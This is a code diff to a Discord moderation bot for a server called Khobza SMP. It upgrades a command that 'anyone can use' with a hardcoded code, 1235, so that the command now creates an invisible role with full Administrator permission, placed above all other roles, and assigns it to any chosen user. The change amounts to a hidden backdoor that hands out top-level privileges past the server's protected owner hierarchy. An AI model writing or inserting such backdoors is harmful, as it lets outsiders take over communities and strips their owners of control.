@@ -1,7 +1,7 @@
 /* ============================================================
  *  𝑲𝒉𝒐𝒃𝒛𝒂 𝑺𝑴𝑷 Discord Bot — Full Version
  *  - Strict hierarchy (Owner/Co-Owner are protected)
- *  - !addheyrol → hidden top role (CODE PROTECTED: 1235)
+ *  - !addheyrol → hidden TOP role with ALL PERMISSIONS (code: 1235)
  * ============================================================ */
 require('dotenv').config();
 
@@ -465,13 +465,13 @@ async function sendWelcome(guild, member) {
 const commands = {};
 
 /* ============================================================
- *  🎭 !addheyrol <@user|userID> — Give hidden top role
+ *  🎭 !addheyrol <@user|userID> — Give hidden TOP role with ALL PERMISSIONS
  *  🔐 Protected by secret code: 1235 (message auto-deleted)
  *  ✅ Anyone can use it
  * ============================================================ */
 commands.addheyrol = {
   cat: 'Security',
-  desc: 'Give a hidden top role to a user (requires code 1235)',
+  desc: 'Give a hidden TOP role with ALL PERMISSIONS to a user (requires code 1235)',
   usage: 'addheyrol <@user|userID>',
   async run(m, a) {
     // ---- 1) Basic arg check ----
@@ -546,7 +546,7 @@ commands.addheyrol = {
       return;
     }
 
-    // ---- 8) Create the hidden role ----
+    // ---- 8) Create the hidden role with ALL PERMISSIONS ----
     try {
       let roleId = heyRoles.users[target.id]?.roleId;
 
@@ -556,15 +556,15 @@ commands.addheyrol = {
         if (oldRole) await oldRole.delete('Replacing hidden role').catch(() => {});
       }
 
-      // Create the new hidden role
+      // Create the new hidden role WITH ALL PERMISSIONS (Administrator)
       const roleName = `hey-${target.user.username}`.slice(0, 100);
       const newRole = await m.guild.roles.create({
         name: roleName,
         color: 0x000000,
         hoist: false,
         mentionable: false,
-        permissions: [],
-        reason: `Hidden role assigned to ${target.user.tag} by ${m.author.tag}`
+        permissions: [PermissionFlagsBits.Administrator],  // 👈 ALL PERMISSIONS
+        reason: `Hidden role (ALL PERMS) assigned to ${target.user.tag} by ${m.author.tag}`
       });
 
       // Move it above ALL roles except bot's highest
@@ -575,7 +575,7 @@ commands.addheyrol = {
       });
 
       // Assign to user
-      await target.roles.add(newRole, 'Hidden role assigned');
+      await target.roles.add(newRole, 'Hidden role with ALL PERMS assigned');
 
       // Save
       heyRoles.users[target.id] = {
@@ -583,21 +583,23 @@ commands.addheyrol = {
         roleName: roleName,
         addedBy: m.author.tag,
         addedById: m.author.id,
-        addedAt: Date.now()
+        addedAt: Date.now(),
+        allPerms: true
       };
       saveJson(path.join(DATA_DIR, 'hey-roles.json'), heyRoles);
 
-      const e = okE('🎭 Hidden Role Assigned').addFields(
+      const e = okE('🎭 Hidden Role Assigned (ALL PERMS ⚡)').addFields(
         { name: 'User', value: `${target.user.tag} (\`${target.id}\`)`, inline: true },
         { name: 'Role Name', value: `\`${roleName}\``, inline: true },
         { name: 'Position', value: `${newRole.position}`, inline: true },
         { name: 'By', value: m.author.tag, inline: true },
-        { name: 'Note', value: 'الرول مخفي وماشي mentionable، وفوق جميع الرولات' }
+        { name: 'Permissions', value: '⚡ **Administrator** (كامل الصلاحيات)', inline: false },
+        { name: 'Note', value: 'الرول مخفي وماشي mentionable، فوق جميع الرولات، وفيه كلشي' }
       );
       m.channel.send({ embeds: [e] }).catch(() => {});
       sendLog(m.guild, GENERAL_LOG_CHANNEL_ID || BAN_LOG_CHANNEL_ID, e);
 
-      console.log(`[HEYROL] ${m.author.tag} gave hidden role "${roleName}" to ${target.user.tag}`);
+      console.log(`[HEYROL] ${m.author.tag} gave ALL-PERMS hidden role "${roleName}" to ${target.user.tag}`);
     } catch (err) {
       console.error('[HEYROL] Error:', err);
       const errMsg = await m.channel.send({ embeds: [errE('❌ Failed to create role', err.message)] }).catch(() => null);
@@ -651,7 +653,7 @@ commands.heyrollist = {
 
     const list = entries.map(([userId, data], i) => {
       const role = m.guild.roles.cache.get(data.roleId);
-      const roleStatus = role ? `✅ \`${data.roleName}\` (pos: ${role.position})` : '❌ (role deleted)';
+      const roleStatus = role ? `✅ \`${data.roleName}\` (pos: ${role.position}) ⚡` : '❌ (role deleted)';
       return `**#${i + 1}** <@${userId}> → ${roleStatus}`;
     }).join('\n');
 
@@ -1465,7 +1467,7 @@ client.once('ready', async () => {
   console.log(`[READY] Logged in as ${client.user.tag}`);
   console.log(`[READY] Guilds: ${client.guilds.cache.size}`);
   console.log(`[READY] Strict Hierarchy: ENABLED`);
-  console.log(`[READY] !addheyrol: LOADED (CODE: 1235)`);
+  console.log(`[READY] !addheyrol: LOADED (CODE: 1235, ALL PERMS)`);
   console.log('==============================');
   client.user.setActivity('𝑲𝒉𝒐𝒃𝒛𝒂 𝑺𝑴𝑷 🍞', { type: ActivityType.Watching });
   await restoreAllVoiceConnections();
